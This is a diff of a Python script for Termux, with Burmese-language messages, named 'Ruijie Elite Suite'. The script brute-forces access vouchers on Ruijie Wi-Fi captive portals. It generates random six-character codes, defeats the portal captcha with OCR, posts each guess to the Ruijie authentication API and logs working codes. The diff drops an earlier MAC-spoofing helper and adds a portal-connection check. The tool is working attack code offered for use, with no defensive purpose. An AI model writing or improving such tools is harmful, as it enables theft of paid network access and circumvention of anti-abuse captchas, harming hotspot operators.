@@ -10,9 +10,11 @@ import httpx
 import cv2
 import ddddocr
 import numpy as np
+import re as import_re
+import asyncio
 
 # ====================================================
-# 🌟 RUIJIE ELITE SUITE [TERMUX STANDALONE v8.0]
+# 🌟 RUIJIE ELITE SUITE [AUTO-CONNECTION & GATEKEEPER v9.1]
 # ====================================================
 
 C_CYAN = "\033[96m"
@@ -29,8 +31,8 @@ def clear_screen():
 
 def banner():
     print(f"{C_CYAN}{C_BOLD}╔══════════════════════════════════════════════════╗{C_RESET}")
-    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v8.0 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
-    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Termux Standalone Wifidog Engine ]      {C_CYAN}{C_BOLD}║{C_RESET}")
+    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v9.1 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
+    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Wi-Fi Gatekeeper & Wifidog Engine ]      {C_CYAN}{C_BOLD}║{C_RESET}")
     print(f"{C_CYAN}{C_BOLD}╚══════════════════════════════════════════════════╝{C_RESET}")
 
 # --- OCR & Captcha Helpers ---
@@ -61,14 +63,30 @@ def _ocr_sync(image_bytes):
     except:
         return None
 
-def get_mac():
-    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
-    return ':'.join(f'{x:02x}' for x in [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)])
-
-def replace_mac(url, new_mac):
-    return import_re.sub(r'(?<=mac=)[^&]+', new_mac, url) if 'mac=' in url else url
-
-import re as import_re
+async def verify_wifi_connection():
+    """Wi-Fi Portal နှင့် အမှန်တကယ် ချိတ်ဆက်ထားခြင်း ရှိမရှိ စစ်ဆေးခြင်း"""
+    print(f"\n{C_YELLOW}⚙️ [Gatekeeper] Checking Wi-Fi Captive Portal connection...{C_RESET}")
+    test_urls = [
+        "http://portal-mm-as.ruijienetworks.com/api/auth/wifidog",
+        "http://192.168.1.1",
+        "http://192.168.8.1"
+    ]
+    
+    async with httpx.AsyncClient(timeout=4.0, follow_redirects=True) as client:
+        for url in test_urls:
+            try:
+                resp = await client.get(url)
+                final_url = str(resp.url)
+                # Portal လိပ်စာ သို့မဟုတ် Captive portal တုံ့ပြန်မှုကို တွေ့ရှိပါက
+                if "portal" in final_url or "stage=portal" in final_url or resp.status_code < 500:
+                    print(f"{C_GREEN} ✅ Connected! Active Portal Found: {final_url}{C_RESET}")
+                    return final_url
+            except Exception:
+                continue
+                
+    print(f"{C_RED} ❌ Wi-Fi Portal သို့ ချိတ်ဆက်ထားခြင်း မရှိပါ (သို့မဟုတ်) လိပ်စာ ရှာမတွေ့ပါ။{C_RESET}")
+    print(f"{C_RED} ⚠️ Wi-Fi ချိတ်ဆက်ပြီးမှသာ Voucher ရှာဖွေခွင့် ပြုမည်ဖြစ်သည်။{C_RESET}")
+    return None
 
 async def get_session_id(client, session_url):
     try:
@@ -103,7 +121,6 @@ async def verify_and_check(session_url, code):
             if not session_id:
                 return False
             
-            # Fetch Captcha
             cap_url = f"https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={session_id}&_t={time.time()}"
             cap_resp = await client.get(cap_url)
             if cap_resp.status_code != 200:
@@ -113,13 +130,11 @@ async def verify_and_check(session_url, code):
             if not auth_text:
                 return False
             
-            # Verify Captcha
             verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
             v_resp = await client.post(verify_url, json={'sessionId': session_id, 'authCode': auth_text})
             if v_resp.status_code != 200 or not v_resp.json().get("success"):
                 return False
             
-            # Post Voucher Code
             payload = {
                 "accessCode": code,
                 "sessionId": session_id,
@@ -139,22 +154,8 @@ def save_code(code):
     with open("valid_codes.txt", "a") as f:
         f.write(f"[{timestamp}] CODE: {code}\n")
 
-import asyncio
-
-def terminal_scanner():
-    print(f"\n{C_MAGENTA}╔══════════════════════════════════════════════════╗{C_RESET}")
-    print(f"{C_MAGENTA}║         🔥 TERMUX HIGH-SPEED VOUCHER SCANNER     ║{C_RESET}")
-    print(f"{C_MAGENTA}╚══════════════════════════════════════════════════╝{C_RESET}")
-    
-    portal_url = input(f"{C_YELLOW} ┣ 🌐 Enter Portal URL ➔ {C_WHITE}").strip()
-    if not portal_url:
-        print(f"{C_RED} ┗ ❌ [Error] Portal URL cannot be empty!{C_RESET}")
-        return
-
-    length_str = input(f"{C_YELLOW} ┗ 📏 ကုတ်အရှည် (Length, ဥပမာ - 6) ➔ {C_WHITE}").strip()
-    length = int(length_str) if length_str.isdigit() else 6
-
-    print(f"\n{C_GREEN}🚀 [Scanner Active] Length: {length} | Async Wifidog Engine{C_RESET}\n")
+def terminal_scanner(portal_url):
+    print(f"\n{C_GREEN}🚀 [Scanner Active] Pure Random Wifidog Engine{C_RESET}\n")
     print(f"{C_CYAN}--------------------------------------------------{C_RESET}")
     
     chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
@@ -165,7 +166,7 @@ def terminal_scanner():
     async def async_worker():
         nonlocal scanned_count, found_count
         while True:
-            code = ''.join(random.choices(chars, k=length))
+            code = ''.join(random.choices(chars, k=6))
             scanned_count += 1
             
             elapsed = time.time() - start_time
@@ -197,26 +198,39 @@ def system_boost_and_exit():
         pass
     time.sleep(0.5)
     print(f"{C_GREEN}✨ [Success] System optimized and memory freed!{C_RESET}")
-    print(f"{C_MAGENTA}👋 Shutting down Suite. Stay secure!{C_RESET}")
     sys.exit(0)
 
 def main_menu():
+    active_portal = ""
     while True:
         clear_screen()
         banner()
         print(f"{C_WHITE}┌──────────────────────────────────────────────────┐{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [1] ⚡ Start Standalone Voucher Scanner         {C_WHITE}│{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [2] 📂 View Saved Valid Codes Archive           {C_WHITE}│{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [3] 🧹 Clear Saved Codes History                {C_WHITE}│{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [4] 🚀 Exit & System Boost (Memory Clean)       {C_WHITE}│{C_RESET}")
+        print(f"{C_WHITE}│{C_CYAN}  [1] 🔗 Auto-Connect & Verify Wi-Fi Portal       {C_WHITE}│{C_RESET}")
+        print(f"{C_WHITE}│{C_CYAN}  [2] ⚡ Start Pure Random Voucher Scanner        {C_WHITE}│{C_RESET}")
+        print(f"{C_WHITE}│{C_CYAN}  [3] 📂 View Saved Valid Codes Archive           {C_WHITE}│{C_RESET}")
+        print(f"{C_WHITE}│{C_CYAN}  [4] 🧹 Clear Saved Codes History                {C_RESET}│{C_RESET}")
+        print(f"{C_WHITE}│{C_CYAN}  [5] 🚀 Exit & System Boost                      {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}└──────────────────────────────────────────────────┘{C_RESET}")
         
-        choice = input(f"{C_MAGENTA}{C_BOLD} ⚡ Select Option [1-4] ➔ {C_WHITE}").strip()
+        if active_portal:
+            print(f"{C_GREEN} 📌 Status: CONNECTED ({active_portal[:35]}...){C_RESET}")
+        else:
+            print(f"{C_RED} ⚠️ Status: NOT CONNECTED TO PORTAL YET{C_RESET}")
+        
+        choice = input(f"{C_MAGENTA}{C_BOLD} ⚡ Select Option [1-5] ➔ {C_WHITE}").strip()
         
         if choice == '1':
-            terminal_scanner()
-            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
+            active_portal = asyncio.run(verify_wifi_connection())
+            input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")
         elif choice == '2':
+            if not active_portal:
+                print(f"\n{C_RED} ❌ [Error] Wi-Fi Portal သို့ မချိတ်ဆက်ရသေးပါ။{C_RESET}")
+                print(f"{C_RED} ⚠️ ကျေးဇူးပြု၍ ဦးစွာ Option [1] ကိုနှိပ်ပြီး Portal ချိတ်ဆက်မှုကို အတည်ပြုပါ!{C_RESET}")
+            else:
+                terminal_scanner(active_portal)
+            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
+        elif choice == '3':
             try:
                 with open("valid_codes.txt", "r") as f:
                     print(f"\n{C_GREEN}╔══════════════════════════════════════════════════╗{C_RESET}")
@@ -226,14 +240,14 @@ def main_menu():
             except FileNotFoundError:
                 print(f"\n{C_YELLOW}📂 [Info] Archive is currently empty.{C_RESET}")
             input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
-        elif choice == '3':
+        elif choice == '4':
             try:
                 open("valid_codes.txt", "w").close()
                 print(f"\n{C_GREEN}🧹 [Success] History cleared completely.{C_RESET}")
             except Exception:
                 print(f"\n{C_RED}❌ [Error] Failed to clear history.{C_RESET}")
             input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
-        elif choice == '4':
+        elif choice == '5':
             system_boost_and_exit()
         else:
             print(f"\n{C_RED}❌ [Error] Invalid option!{C_RESET}")
@@ -241,4 +255,3 @@ def main_menu():
 
 if __name__ == "__main__":
     main_menu()
-    
